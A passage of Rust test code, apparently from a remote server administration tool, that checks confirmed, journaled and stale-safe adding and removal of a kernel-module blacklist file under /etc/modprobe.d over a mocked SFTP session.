        assert_eq!(entries.len(), 2);
        assert!(
            entries
                .iter()
                .all(|entry| entry.source == "system-info-suid")
        );
    }

    #[tokio::test]
    async fn managed_module_blacklist_is_exclusive_exact_and_recoverable() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        harness.set_sftp_immediate(true);
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::KernelModules, 1).unwrap(),
            "nf_conntrack\t4096\t0\tnormal",
        );
        let path =
            RemotePath::new("/etc/modprobe.d/lovelyres-blacklist-nf_conntrack.conf").unwrap();
        let add_request = table
            .artifact_mutation_request(
                &table.rows[0].id,
                ArtifactMutationAction::AddManagedModuleBlacklist,
            )
            .unwrap();
        let add_plan = services
            .system_info()
            .plan_artifact_mutation(&session, &add_request)
            .await
            .unwrap();
        assert_eq!(
            add_plan
                .definition()
                .metadata
                .get("mode")
                .map(String::as_str),
            Some("644")
        );
        let confirmation = DangerousConfirmation::approve(add_plan.definition());
        let added = services
            .system_info()
            .execute_artifact_mutation(
                &session,
                add_plan,
                confirmation,
                services.operation_journal(),
            )
            .await
            .unwrap();
        assert!(added.verification.passed);
        let bound = services
            .sftp()
            .bind_session(session.target().clone(), session.session_id())
            .await
            .unwrap();
        let expected = managed_module_policy_content("nf_conntrack").unwrap();
        assert_eq!(
            services.sftp().read_file(&bound, &path).await.unwrap(),
            expected
        );
        assert!(
            services
                .system_info()
                .plan_artifact_mutation(&session, &add_request)
                .await
                .is_err()
        );

        let remove_request = table
            .artifact_mutation_request(
                &table.rows[0].id,
                ArtifactMutationAction::RemoveManagedModuleBlacklist,
            )
            .unwrap();
        let stale_remove = services
            .system_info()
            .plan_artifact_mutation(&session, &remove_request)
            .await
            .unwrap();
        harness.set_sftp_file(path.as_str(), b"blacklist changed\n".to_vec());
        let confirmation = DangerousConfirmation::approve(stale_remove.definition());
        assert!(
            services
                .system_info()
                .execute_artifact_mutation(
                    &session,
                    stale_remove,
                    confirmation,
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert_eq!(services.operation_journal().entries().unwrap().len(), 2);

        harness.set_sftp_file(path.as_str(), expected);
        let remove_plan = services
            .system_info()
            .plan_artifact_mutation(&session, &remove_request)
            .await
            .unwrap();
        let confirmation = DangerousConfirmation::approve(remove_plan.definition());
        let removed = services
            .system_info()
            .execute_artifact_mutation(
                &session,
                remove_plan,
                confirmation,
                services.operation_journal(),
            )
            .await
            .unwrap();
        assert!(removed.verification.passed);
        assert!(!services.sftp().exists(&bound, &path).await.unwrap());
        assert_eq!(services.operation_journal().entries().unwrap().len(), 4);
    }
}
